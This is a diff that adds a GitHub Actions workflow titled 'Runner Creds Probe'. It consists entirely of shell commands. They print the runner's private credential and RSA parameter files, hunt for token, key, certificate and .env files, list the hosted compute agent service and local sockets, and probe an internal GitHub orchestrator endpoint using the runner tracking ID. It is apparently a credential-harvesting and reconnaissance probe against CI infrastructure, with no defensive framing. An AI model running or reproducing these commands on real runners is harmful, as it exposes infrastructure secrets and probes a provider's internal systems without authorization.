@@ -1,0 +1,39 @@
+name: Runner Creds Probe
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Read runner credentials
+        run: |
+          echo "=== Runner .credentials file ==="
+          cat /home/runner/actions-runner/cached/2.335.1/.credentials 2>/dev/null || echo "cannot read"
+          echo ""
+          
+          echo "=== All credential files in runner dir ==="
+          find /home/runner/actions-runner -name "*credential*" -o -name "*token*" -o -name "*.key" -o -name "*.pem" -o -name "*.cert" -o -name "*.pfx" -o -name ".env" 2>/dev/null | head -20
+          echo ""
+          
+          echo "=== Compute agent files ==="
+          find / -name "hosted-compute-agent*" -o -name "hc-agent*" 2>/dev/null | head -10
+          systemctl status hosted-compute-agent.service 2>/dev/null | head -10
+          echo ""
+          
+          echo "=== Local sockets ==="
+          ss -tlnp 2>/dev/null | head -10
+          echo ""
+          
+          echo "=== Runner .credentials_rsaparams ==="
+          cat /home/runner/actions-runner/cached/2.335.1/.credentials_rsaparams 2>/dev/null | head -5 || echo "not found"
+          echo ""
+          
+          echo "=== Runner .runner file ==="
+          cat /home/runner/actions-runner/cached/2.335.1/.runner 2>/dev/null || echo "not found"
+          echo ""
+          
+          echo "=== Try orchestrator with runner tracking ID ==="
+          curl -s -w "\n%{http_code}" \
+            -H "X-Runner-Tracking-Id: $RUNNER_TRACKING_ID" \
+            "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1" 2>/dev/null | head -3
